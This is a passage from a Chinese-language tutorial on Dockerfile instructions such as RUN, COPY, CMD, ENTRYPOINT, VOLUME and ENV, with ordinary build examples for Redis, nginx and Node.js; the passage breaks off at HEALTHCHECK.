中的主机名。<br>--dns-search=DOMAIN： 设定容器的搜索域，当设定搜索域为 .example.com 时，在搜索一个名为 host 的主机时，DNS 不仅搜索 host，还会搜索 host.example.com。<br></code></pre></td></tr></table></figure><h2 id="10-Dockerfile"><a href="#10-Dockerfile" class="headerlink" title="10 .Dockerfile"></a>10 .Dockerfile</h2><h3 id="什么是-Dockerfile？"><a href="#什么是-Dockerfile？" class="headerlink" title="什么是 Dockerfile？"></a>什么是 Dockerfile？</h3><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。</p><ol><li>案例：</li></ol><p>创建Dockerfile文件</p><p><strong>vi Dockerfile</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">FROM docker.io/kalilinux/kali-linux-docker<br>RUN echo &#x27;test&#x27; &gt; /root/test<br></code></pre></td></tr></table></figure><p>创建镜像</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker build -t kali:test .   // kali:test（镜像名称:镜像标签）,最后的 . 代表本次执行的上下文路径<br></code></pre></td></tr></table></figure><ol start="2"><li><p>FROM 和 RUN 指令的作用</p><p><strong>FROM</strong>：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p><p><strong>RUN</strong>：用于执行后面跟着的命令行命令。有以下俩种格式：</p></li></ol><p>shell 格式：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="bash"> &lt;命令行命令&gt;</span><br><span class="hljs-comment"># &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</span><br></code></pre></td></tr></table></figure><p>exec 格式：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="bash"> [<span class="hljs-string">&quot;可执行文件&quot;</span>, <span class="hljs-string">&quot;参数1&quot;</span>, <span class="hljs-string">&quot;参数2&quot;</span>]</span><br><span class="hljs-comment"># 例如：</span><br><span class="hljs-comment"># RUN [&quot;./test.php&quot;, &quot;dev&quot;, &quot;offline&quot;] 等价于 RUN ./test.php dev offline</span><br></code></pre></td></tr></table></figure><p><strong>注意</strong>：Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大。例如：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> centos<br><span class="hljs-keyword">RUN</span><span class="bash"> yum install wget</span><br><span class="hljs-keyword">RUN</span><span class="bash"> wget -O redis.tar.gz <span class="hljs-string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span></span><br><span class="hljs-keyword">RUN</span><span class="bash"> tar -xvf redis.tar.gz</span><br><br>以上执行会创建 <span class="hljs-number">3</span> 层镜像。可简化为以下格式：<br><br><span class="hljs-keyword">FROM</span> centos<br><span class="hljs-keyword">RUN</span><span class="bash"> yum install wget \</span><br><span class="bash">  &amp;&amp; wget -O redis.tar.gz <span class="hljs-string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span><br><span class="bash">  &amp;&amp; tar -xvf redis.tar.gz</span><br><br>如上，以 &amp;&amp; 符号连接命令，这样执行后，只会创建 <span class="hljs-number">1</span> 层镜像。<br></code></pre></td></tr></table></figure><h3 id="上下文路径"><a href="#上下文路径" class="headerlink" title="上下文路径"></a>上下文路径</h3><p>上面中，有提到指令最后一个 <strong>.</strong> 是上下文路径，那么什么是上下文路径呢？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build -t kali:test .<br></code></pre></td></tr></table></figure><p>上下文路径，是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。</p><p><strong>解析</strong>：由于 docker 的运行模式是 C/S。我们本机是 C，docker 引擎是 S。实际的构建过程是在 docker 引擎下完成的，所以这个时候无法用到我们本机的文件。这就需要把我们本机的指定目录下的文件一起打包提供给 docker 引擎使用。</p><p>如果未说明最后一个参数，那么默认上下文路径就是 Dockerfile 所在的位置。</p><p><strong>注意</strong>：上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。</p><h3 id="指令详解"><a href="#指令详解" class="headerlink" title="指令详解"></a>指令详解</h3><h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p>复制指令，从上下文目录中复制文件或者目录到容器里指定路径。</p><p>格式：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bnf">COPY [--chown=<span class="hljs-attribute">&lt;user&gt;</span>:<span class="hljs-attribute">&lt;group&gt;</span>] <span class="hljs-attribute">&lt;源路径1&gt;</span>...  <span class="hljs-attribute">&lt;目标路径&gt;</span><br>COPY [--chown=<span class="hljs-attribute">&lt;user&gt;</span>:<span class="hljs-attribute">&lt;group&gt;</span>] [&quot;<span class="hljs-attribute">&lt;源路径1&gt;</span>&quot;,...  &quot;<span class="hljs-attribute">&lt;目标路径&gt;</span>&quot;]<br></code></pre></td></tr></table></figure><p>**[–chown=:]**：可选参数，用户改变复制到容器内文件的拥有者和属组。</p><p>**&lt;源路径&gt;**：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则。例如：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">COPY</span> hom* <span class="hljs-regexp">/mydir/</span><br><span class="hljs-keyword">COPY</span> hom?.txt <span class="hljs-regexp">/mydir/</span><br></code></pre></td></tr></table></figure><p>**&lt;目标路径&gt;**：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。</p><h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>ADD 指令和 COPY 的使用格式一致（同样需求下，官方推荐使用 COPY）。功能也类似，不同之处如下：</p><ul><li>ADD 的优点：在执行 &lt;源文件&gt; 为 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，会自动复制并解压到 &lt;目标路径&gt;。</li><li>ADD 的缺点：在不解压的前提下，无法复制 tar 压缩文件。会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。具体是否使用，可以根据是否需要自动解压来决定。</li></ul><pre><code>    因此在 COPY 和 ADD 指令中选择的时候，可以遵循这样的原则，**所有的文件复制均使用 COPY 指令，仅在需要自动解压缩的场合使用 ADD 。**</code></pre><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>类似于 RUN 指令，用于运行程序，但二者运行的时间点不同:</p><ul><li>CMD 在docker run 时运行。</li><li>RUN 是在 docker build。</li></ul><p><strong>作用</strong>：为启动的容器指定默认要运行的程序，程序运行结束，容器也就结束。CMD 指令指定的程序可被 docker run 命令行参数中指定要运行的程序所覆盖。</p><p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 CMD 指令，仅最后一个生效。</p><p>格式：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">CMD</span><span class="bash"> &lt;shell 命令&gt; </span><br><span class="hljs-keyword">CMD</span><span class="bash"> [<span class="hljs-string">&quot;&lt;可执行文件或命令&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;param1&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;param2&gt;&quot;</span>,...] </span><br><span class="hljs-keyword">CMD</span><span class="bash"> [<span class="hljs-string">&quot;&lt;param1&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;param2&gt;&quot;</span>,...]  <span class="hljs-comment"># 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数</span></span><br></code></pre></td></tr></table></figure><p>推荐使用第二种格式，执行过程比较明确。第一种格式实际上在运行的过程中也会自动转换成第二种格式运行，并且默认可执行文件是 sh。</p><h4 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h4><p>类似于 CMD 指令，但其不会被 docker run 的命令行参数指定的指令所覆盖，而且这些命令行参数会被当作参数送给 ENTRYPOINT 指令指定的程序。</p><p>但是, 如果运行 docker run 时使用了 –entrypoint 选项，此选项的参数可当作要运行的程序覆盖 ENTRYPOINT 指令指定的程序。</p><p><strong>优点</strong>：在执行 docker run 的时候可以指定 ENTRYPOINT 运行所需的参数。</p><p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 ENTRYPOINT 指令，仅最后一个生效。</p><p>格式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ENTRYPOINT <span class="hljs-selector-attr">[<span class="hljs-string">&quot;&lt;executeable&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;param1&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;param2&gt;&quot;</span>,...]</span><br></code></pre></td></tr></table></figure><p>当指定了 ENTRYPOINT 后， CMD 的含义就发生了改变，不再是直接的运行其命令，而是将CMD 的内容作为参数传给 ENTRYPOINT 指令，换句话说实际执行时，将变为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ENTRYPOINT</span>&gt;</span> &quot;<span class="hljs-tag">&lt;<span class="hljs-name">CMD</span>&gt;</span>&quot;<br></code></pre></td></tr></table></figure><p>可以搭配 CMD 命令使用：一般是变参才会使用 CMD ，这里的 CMD 等于是在给 ENTRYPOINT 传参，以下示例会提到。</p><p>示例：</p><p>假设已通过 Dockerfile 构建了 nginx:test 镜像：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> nginx<br><br><span class="hljs-keyword">ENTRYPOINT</span><span class="bash"> [<span class="hljs-string">&quot;nginx&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>] <span class="hljs-comment"># 定参</span></span><br><span class="hljs-keyword">CMD</span><span class="bash"> [<span class="hljs-string">&quot;/etc/nginx/nginx.conf&quot;</span>] <span class="hljs-comment"># 变参 </span></span><br></code></pre></td></tr></table></figure><p>1、不传参运行</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ docker <span class="hljs-keyword">run</span><span class="bash">  nginx:<span class="hljs-built_in">test</span></span><br></code></pre></td></tr></table></figure><p>容器内会默认运行以下命令，启动主进程。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nginx -c <span class="hljs-regexp">/etc/</span>nginx/nginx.conf<br></code></pre></td></tr></table></figure><p>2、传参运行</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ docker run  nginx:test -c <span class="hljs-regexp">/etc/</span>nginx/<span class="hljs-keyword">new</span>.conf<br></code></pre></td></tr></table></figure><p>容器内会默认运行以下命令，启动主进程(/etc/nginx/new.conf:假设容器内已有此文件)</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">nginx -c <span class="hljs-regexp">/etc/</span>nginx/<span class="hljs-keyword">new</span>.conf<br></code></pre></td></tr></table></figure><p>那么有了 CMD 后，为什么还要有 ENTRYPOINT 呢？这种 <code> &quot;&quot;</code> 有什么好处么？让我们来看几个场景。</p><p>场景一：让镜像变成像命令一样使用</p><p>  假设我们需要一个得知自己当前公网 IP 的镜像，那么可以先用 CMD 来实现：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">FROM ubuntu:<span class="hljs-number">16.04</span><br>RUN apt-get update \<br>&amp;&amp; apt-get install -y curl \<br>&amp;&amp; rm -rf <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/apt/</span>lists/*<br>CMD [ <span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;-s&quot;</span>, <span class="hljs-string">&quot;http://ip.cn&quot;</span> ]<br></code></pre></td></tr></table></figure><p>假如我们使用 <code>docker build -t myip .</code> 来构建镜像的话，如果我们需要查询当前公网 IP，只需要执行：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ docker <span class="hljs-builtin-name">run</span> myip<br>当前 IP：61.148.226.66 来自：北京市 联通<br></code></pre></td></tr></table></figure><p>嗯，这么看起来好像可以直接把镜像当做命令使用了，不过命令总有参数，如果我们希望加参数呢？比如从上面的 CMD 中可以看到实质的命令是 curl ，那么如果我们希望显示 HTTP头信息，就需要加上 -i 参数。那么我们可以直接加 <code>-i 参数</code>给 <code>docker run myip</code> 么？</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">$ docker run myip <span class="hljs-operator">-</span>i<br>docker: <span class="hljs-type">Error</span> response from daemon: invalid header field value <span class="hljs-string">&quot;oci runtime error: con</span><br><span class="hljs-string">tainer_linux.go:247: starting container process caused <span class="hljs-subst">\&quot;</span>exec: <span class="hljs-subst">\\</span><span class="hljs-subst">\&quot;</span>-i<span class="hljs-subst">\\</span><span class="hljs-subst">\&quot;</span>: executable</span><br><span class="hljs-string">file not found in $PATH<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\n</span>&quot;</span>.<br></code></pre></td></tr></table></figure><p>我们可以看到可执行文件找不到的报错， <code>executable file not found</code> 。之前我们说过，跟在镜像名后面的是 command ，运行时会替换 CMD 的默认值。因此这里的 -i 替换了原来的 CMD ，而不是添加在原来的 <code>curl -s http://ip.cn</code> 后面。而 -i 根本不是命令，所以自然找不到。</p><p>那么如果我们希望加入 -i 这参数，我们就必须重新完整的输入这个命令：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ docker run myip curl -s http:<span class="hljs-comment">//ip.cn -i</span><br></code></pre></td></tr></table></figure><p>这显然不是很好的解决方案，而使用 ENTRYPOINT 就可以解决这个问题。现在我们重新用 ENTRYPOINT 来实现这个镜像：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">FROM ubuntu:<span class="hljs-number">16.04</span><br>RUN apt-get update \<br>&amp;&amp; apt-get install -y curl \<br>&amp;&amp; rm -rf <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/apt/</span>lists/*<br>ENTRYPOINT [ <span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;-s&quot;</span>, <span class="hljs-string">&quot;http://ip.cn&quot;</span> ]<br></code></pre></td></tr></table></figure><p>这次我们再来尝试直接使用 docker run myip -i ：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ docker run myip<br>当前 IP：<span class="hljs-number">61.148</span><span class="hljs-number">.226</span><span class="hljs-number">.66</span> 来自：北京市 联通<br>$ docker run myip -i<br>HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-keyword">Server</span>: nginx/<span class="hljs-number">1.8</span><span class="hljs-number">.0</span><br><span class="hljs-type">Date</span>: Tue, <span class="hljs-number">22</span> Nov <span class="hljs-number">2016</span> <span class="hljs-number">05</span>:<span class="hljs-number">12</span>:<span class="hljs-number">40</span> GMT<br>Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/html; charset=UTF<span class="hljs-number">-8</span><br>Vary: Accept-<span class="hljs-keyword">Encoding</span><br>X-Powered-<span class="hljs-keyword">By</span>: PHP/<span class="hljs-number">5.6</span><span class="hljs-number">.24</span><span class="hljs-number">-1</span>~dotdeb+<span class="hljs-number">7.1</span><br>X-<span class="hljs-keyword">Cache</span>: MISS from <span class="hljs-keyword">cache</span><span class="hljs-number">-2</span><br>X-<span class="hljs-keyword">Cache</span>-Lookup: MISS from <span class="hljs-keyword">cache</span><span class="hljs-number">-2</span>:<span class="hljs-number">80</span><br>X-<span class="hljs-keyword">Cache</span>: MISS from proxy<span class="hljs-number">-2</span>_6<br>Transfer-<span class="hljs-keyword">Encoding</span>: chunked<br>Via: <span class="hljs-number">1.1</span> <span class="hljs-keyword">cache</span><span class="hljs-number">-2</span>:<span class="hljs-number">80</span>, <span class="hljs-number">1.1</span> proxy<span class="hljs-number">-2</span>_6:<span class="hljs-number">8006</span><br><span class="hljs-keyword">Connection</span>: keep-alive<br><br>当前 IP：<span class="hljs-number">61.148</span><span class="hljs-number">.226</span><span class="hljs-number">.66</span> 来自：北京市 联通<br></code></pre></td></tr></table></figure><p>  可以看到，这次成功了。这是因为当存在 ENTRYPOINT 后， CMD 的内容将会作为参数传给 ENTRYPOINT ，而这里 -i 就是新的 CMD ，因此会作为参数传给 curl ，从而达到了我们预期的效果。</p><p>场景二：应用运行前的准备工作</p><p>  启动容器就是启动主进程，但有些时候，启动主进程前，需要一些准备工作。比如 mysql 类的数据库，可能需要一些数据库配置、初始化的工作，这些工作要在最终的 mysql 服务器运行之前解决。</p><p>  此外，可能希望避免使用 root 用户去启动服务，从而提高安全性，而在启动服务前还需要以 root 身份执行一些必要的准备工作，最后切换到服务用户身份启动服务。或者除了服务外，其它命令依旧可以使用 root 身份执行，方便调试等。</p><p>  这些准备工作是和容器 CMD 无关的，无论 CMD 为什么，都需要事先进行一个预处理的工作。这种情况下，可以写一个脚本，然后放入 ENTRYPOINT 中去执行，而这个脚本会将接到的参数（也就是 ）作为命令，在脚本最后执行。比如官方镜像 redis 中就是这么做的：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> alpine:<span class="hljs-number">3.4</span><br><br>...<br><br><span class="hljs-keyword">RUN</span><span class="bash"> addgroup -S redis &amp;&amp; adduser -S -G redis redis</span><br><br>...<br><br><span class="hljs-keyword">ENTRYPOINT</span><span class="bash"> [<span class="hljs-string">&quot;docker-entrypoint.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">6379</span><br><br><span class="hljs-keyword">CMD</span><span class="bash"> [ <span class="hljs-string">&quot;redis-server&quot;</span> ]</span><br></code></pre></td></tr></table></figure><p>  可以看到其中为了 redis 服务创建了 redis 用户，并在最后指定了 ENTRYPOINT 为 dockerentrypoint.sh 脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>...<br><span class="hljs-comment"># allow the container to be started with `--user`</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = <span class="hljs-string">&#x27;redis-server&#x27;</span> -a <span class="hljs-string">&quot;<span class="hljs-subst">$(id -u)</span>&quot;</span> = <span class="hljs-string">&#x27;0&#x27;</span> ]; <span class="hljs-keyword">then</span><br><br>    chown -R redis .<br>    <span class="hljs-built_in">exec</span> su-exec redis <span class="hljs-string">&quot;<span class="hljs-variable">$0</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br></code></pre></td></tr></table></figure><p>  该脚本的内容就是根据 CMD 的内容来判断，如果是 redis-server 的话，则切换到 redis 用户身份启动服务器，否则依旧使用 root 身份执行。比如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ docker <span class="hljs-builtin-name">run</span> -it redis id<br><span class="hljs-attribute">uid</span>=0(root) <span class="hljs-attribute">gid</span>=0(root) <span class="hljs-attribute">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p>  而使用 <code>service nginx start</code> 命令，则是希望 <code>systemd</code> 来以后台守护进程形式启动 nginx 服务。而刚才说了 <code>CMD service nginx start</code> 会被理解为 CMD [ “sh”, “-c”, “service nginxstart”] ，<strong>因此主进程实际上是 sh 。那么当 service nginx start 命令结束后， sh 也就结束了， sh 作为主进程退出了，自然就会令容器退出。</strong></p><p>  正确的做法是<strong>直接执行 nginx 可执行文件</strong>，并且要求以前台形式运行。比如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">CMD <span class="hljs-selector-attr">[<span class="hljs-string">&quot;nginx&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;daemon off;&quot;</span>]</span><br></code></pre></td></tr></table></figure><h3 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h3><p>仅仅只是声明端口。</p><p><strong>EXPOSE 指令是声明运行时容器提供服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。</strong></p><p>作用：</p><ul><li>帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。</li><li>在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。</li></ul><p>格式：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">EXPOSE</span> &lt;端口<span class="hljs-number">1</span>&gt;<span class="hljs-meta"> [&lt;端口2&gt;...]</span><br></code></pre></td></tr></table></figure><h3 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h3><p>指定工作目录。用 WORKDIR 指定的工作目录，会在构建镜像的每一层中都存在。（WORKDIR 指定的工作目录，必须是提前创建好的）。</p><p>docker build 构建镜像过程中的，每一个 RUN 命令都是新建的一层。只有通过 WORKDIR 创建的目录才会一直存在。</p><p>格式：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">WORKDIR <span class="hljs-attribute">&lt;工作目录路径&gt;</span><br></code></pre></td></tr></table></figure><h3 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h3><p>用于指定执行后续命令的用户和用户组，这边只是切换后续命令执行的用户（用户和用户组必须提前已经存在）。</p><p>格式：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">USER <span class="hljs-attribute">&lt;用户名&gt;</span>[:<span class="hljs-attribute">&lt;用户组&gt;</span>]<br></code></pre></td></tr></table></figure><h3 id="VOLUME-定义匿名卷"><a href="#VOLUME-定义匿名卷" class="headerlink" title="VOLUME 定义匿名卷"></a>VOLUME 定义匿名卷</h3><p>格式为：</p> <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">VOLUME</span><span class="bash"> [<span class="hljs-string">&quot;&lt;路径1&gt;&quot;</span>, <span class="hljs-string">&quot;&lt;路径2&gt;&quot;</span>...]</span><br><span class="hljs-keyword">VOLUME</span><span class="bash"> &lt;路径&gt;</span><br></code></pre></td></tr></table></figure><p>  容器运行时应该尽量保持容器存储层不发生写操作，对于数据库类需要保存动态数据的应用，其数据库文件应该保存于卷(volume)中。为了防止运行时用户忘记将动态文件所保存目录挂载为卷，在 Dockerfile 中，我们可以事先指定某些目录挂载为匿名卷，这样在运行时如果用户不指定挂载，其应用也可以正常运行，不会向容器存储层写入大量数据。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-type">VOLUME</span> /<span class="hljs-class"><span class="hljs-keyword">data</span></span><br></code></pre></td></tr></table></figure><p>  这里的 <code>/data</code> 目录就会在运行时自动挂载为匿名卷，任何向 /data 中写入的信息都不会记录进容器存储层，从而保证了容器存储层的无状态化。当然，运行时可以覆盖这个挂载设置。比如：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">docker</span> run -d -v mydata:/<span class="hljs-class"><span class="hljs-keyword">data</span> xxxx</span><br></code></pre></td></tr></table></figure><p>  在这行命令中，就使用了 mydata 这个命名卷挂载到了 <code>/data</code> 这个位置，替代了 Dockerfile 中定义的匿名卷的挂载配置。</p><p> </p><h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><p>设置环境变量，定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。</p><p>格式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">ENV <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><br>ENV <span class="hljs-tag">&lt;<span class="hljs-name">key1</span>&gt;</span>=<span class="hljs-tag">&lt;<span class="hljs-name">value1</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">key2</span>&gt;</span>=<span class="hljs-tag">&lt;<span class="hljs-name">value2</span>&gt;</span>...<br></code></pre></td></tr></table></figure><p>以下示例设置 NODE_VERSION = 7.2.0 ， 在后续的指令中可以通过 $NODE_VERSION 引用：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">ENV</span> NODE_VERSION <span class="hljs-number">7.2</span>.<span class="hljs-number">0</span><br><br><span class="hljs-keyword">RUN</span><span class="bash"> curl -SLO <span class="hljs-string">&quot;https://nodejs.org/dist/v<span class="hljs-variable">$NODE_VERSION</span>/node-v<span class="hljs-variable">$NODE_VERSION</span>-linux-x64.tar.xz&quot;</span> \</span><br><span class="bash">  &amp;&amp; curl -SLO <span class="hljs-string">&quot;https://nodejs.org/dist/v<span class="hljs-variable">$NODE_VERSION</span>/SHASUMS256.txt.asc&quot;</span></span><br></code></pre></td></tr></table></figure><h3 id="ARG"><a href="#ARG" class="headerlink" title="ARG"></a>ARG</h3><p>构建参数，与 ENV 作用一至。不过作用域不一样。ARG 设置的环境变量仅对 Dockerfile 内有效，也就是说只有 docker build 的过程中有效，构建好的镜像内不存在此环境变量。</p><p>构建命令 docker build 中可以用 –build-arg &lt;参数名&gt;=&lt;值&gt; 来覆盖。</p><p>格式：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">ARG <span class="hljs-attribute">&lt;参数名&gt;</span>[=<span class="hljs-attribute">&lt;默认值&gt;</span>]<br></code></pre></td></tr></table></figure><h3 id="HEALTHCHECK"><a href="#HEALTHCHECK" class="headerlink" title="HEALTHCHECK"></a>HEALTHCHECK</h3><p>用于指定某个程序或者指令来监控 docker 容器服务的运行状态。</p><p>格式：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dos">HEALTHCHECK [选项] <span class="hljs-built_in">CMD</span> &lt;命令&gt;：设置检查容器健康状况的命令<br>HEALTHCHECK 